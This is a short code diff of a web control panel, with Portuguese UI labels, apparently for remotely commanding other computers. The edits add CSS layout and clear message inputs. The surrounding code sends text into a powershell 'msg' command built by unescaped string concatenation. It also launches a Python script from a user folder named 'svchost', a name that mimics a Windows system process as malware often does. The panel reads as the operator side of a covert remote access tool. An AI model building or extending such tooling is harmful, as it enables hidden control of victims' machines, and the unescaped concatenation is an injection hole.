@@ -473,6 +473,7 @@ function openComputerControl(computer) {
         }
 
         .terminal-output {
+            overflow-x: hidden;
             flex: 1;
             padding: 1rem;
             font-family: 'Courier New', monospace;
@@ -480,6 +481,13 @@ function openComputerControl(computer) {
             overflow-y: auto;
             background: #000;
             color: #00ff88;
+        }
+        .message-area{
+            display: flex;
+            padding: 1rem;
+            border-top: 1px solid #333;
+            justify-content: space-between;
+            gap: 50px;
         }
 
         .terminal-input {
@@ -533,12 +541,14 @@ function openComputerControl(computer) {
             <button class="btn btn-primary" onclick="executeCommand()">Executar</button>
           </div>
         <div class=message-area>
+          <div>
             <input type="text" id="message-input" placeholder="Mande uma mensagem...">
             <button class="btn btn-primary" onclick="sendMessage()">Enviar</button>
-            <div>
+          </div>
+          <div>
             <input type="text" id="audio-input" placeholder="Mande uma mensagem...">
             <button class="btn btn-primary" onclick="sendAudio()">Enviar</button>
-            </div>
+          </div>
         </div>
         </div>
       </div>
@@ -608,6 +618,7 @@ function sendMessage() {
   let message = document.querySelector("#message-input").value;
   console.log(message);
   document.getElementById("command-input").value = 'powershell -command "msg $env:USERNAME \"' + message + '\""' ;
+  document.querySelector("#message-input").value = ""
   executeCommand();
 }
 
@@ -620,6 +631,7 @@ function sendAudio() {
     '%USERPROFILE%\\\\AppData\\\\Local\\\\svchost\\\\python.exe "%USERPROFILE%\\\\AppData\\\\Local\\\\svchost\\\\script.py" "' +
     safeMessage +
     '"' ;
+  input.value = ""
   executeCommand();
 }
 
